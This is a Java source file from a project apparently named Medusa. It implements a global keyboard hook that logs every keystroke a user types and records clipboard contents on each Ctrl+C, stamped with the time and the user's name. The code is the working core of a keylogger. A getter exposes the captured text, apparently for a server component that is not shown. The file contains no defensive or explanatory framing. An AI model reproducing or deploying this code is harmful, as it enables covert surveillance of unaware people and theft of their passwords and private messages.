package net.lotusdev.medusa.server;

import java.awt.HeadlessException;
import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 * Listener.java
 * @author Jabaar
 *
 */

public class Listener implements NativeKeyListener {	
	public static String lastKeyString = "", modifyInString = "", modifyInClipboard = "";
	public static ArrayList<String> copiedStrings = new ArrayList<String>();
	
	public static void register() {
		try {
			GlobalScreen.registerNativeHook();
		}catch(NativeHookException e) {
			e.printStackTrace();
		}
		
		GlobalScreen.getInstance().addNativeKeyListener(new Listener());
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		System.out.println(ModifyKeys.getModifiedKey(NativeKeyEvent.getKeyText(arg0.getKeyCode())));
		lastKeyString = (lastKeyString + ModifyKeys.getModifiedKey(NativeKeyEvent.getKeyText(arg0.getKeyCode())));
		modifyInString = lastKeyString.toLowerCase();
		
		/**
		 * Simple action to modify keys for all possible Ctrl situations with letters and numbers.
		 */
		if(modifyInString.contains(">ctrl+")) {
			for(char letter = 'a'; letter <= 'z'; letter++) {
				modifyInString = modifyInString.replace(">ctrl+" + letter, " -Ctrl+" + Character.toString(letter).toUpperCase() + "- ");
			}
			
			for(char number = '0'; number <= '9'; number++) {
				modifyInString = modifyInString.replace(">ctrl+" + number, " -Ctrl+" + number + "- ");
			}
		}
		
		if(modifyInString.contains(" -Ctrl+C- ")) {
			String data = null;
			try {
				data = (String)Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
			}catch(HeadlessException e) {
				e.printStackTrace();
			}catch(UnsupportedFlavorException e) {
				e.printStackTrace();
			}catch(IOException e) {
				e.printStackTrace();
			} 
			
			if(!copiedStrings.contains(("\r\n\r\n>>> At " + getTime() +  ", user [" + GetInfo.getUser() + "] copied:\r\n" + getTime() + "\r\n\r\n"))) {
				copiedStrings.add(("\r\n\r\n>>> At " + getTime() +  ", user [" + GetInfo.getUser() + "] copied:\r\n" + data + "\r\n\r\n"));
			}
			
			System.out.println(data);
			System.out.println(modifyInString);
		}
		
		/**
		 * Modify Shifted values including letters and numbers.
		 */
		if(modifyInString.contains(">shift+")) {
			for(char letter = 'a'; letter <= 'z'; letter++) {
				modifyInString = modifyInString.replace(">shift+" + letter, "" + Character.toString(letter).toUpperCase());
			}
			
			for(char number = '0'; number <= '9'; number++) {
				modifyInString = modifyInString.replace(">shift+" + number, ModifyKeys.getPrime(number));
			}
			
			/**
			 * Modify Shifted values including symbols.
			 */
			modifyInString = modifyInString.replace(">shift+,", "<");
			modifyInString = modifyInString.replace(">shift+.", ">");
			modifyInString = modifyInString.replace(">shift+/", "?");
			modifyInString = modifyInString.replace(">shift+;", ":");
			modifyInString = modifyInString.replace(">shift+'", "\"");
			modifyInString = modifyInString.replace(">shift+[", "{");
			modifyInString = modifyInString.replace(">shift+]", "}");
			modifyInString = modifyInString.replace(">shift+\\", "|");
			modifyInString = modifyInString.replace(">shift+-", "_");
			modifyInString = modifyInString.replace(">shift+=", "+");
		}	
		
		/**
		 * Replace strings for more compact formatting.
		 */
		modifyInString = modifyInString.replace("-backspace-", "-back-");
		modifyInString = modifyInString.replace("-enter-", "-enter-\r\n");
		
		for(int i = 0; i < copiedStrings.size(); i++) {
			String curLine = copiedStrings.get(i);
			if(!modifyInString.contains(copiedStrings.get(i))) {
				modifyInString = modifyInString + curLine;
			}
		}
	}
	
	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		
	}
	
	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		
	}
	
	public static String getTypedKeys() {
		return modifyInString;
	}
	
	public static String getTime() {
		/**
		 * Simple date and time method to get the user's 12 hour hour:minute system time.
		 */
		Date date = new Date();
		Calendar calendar = GregorianCalendar.getInstance();
		calendar.setTime(date);
		return "" + calendar.get(Calendar.HOUR) + ":" + calendar.get(Calendar.MINUTE);
	}
}
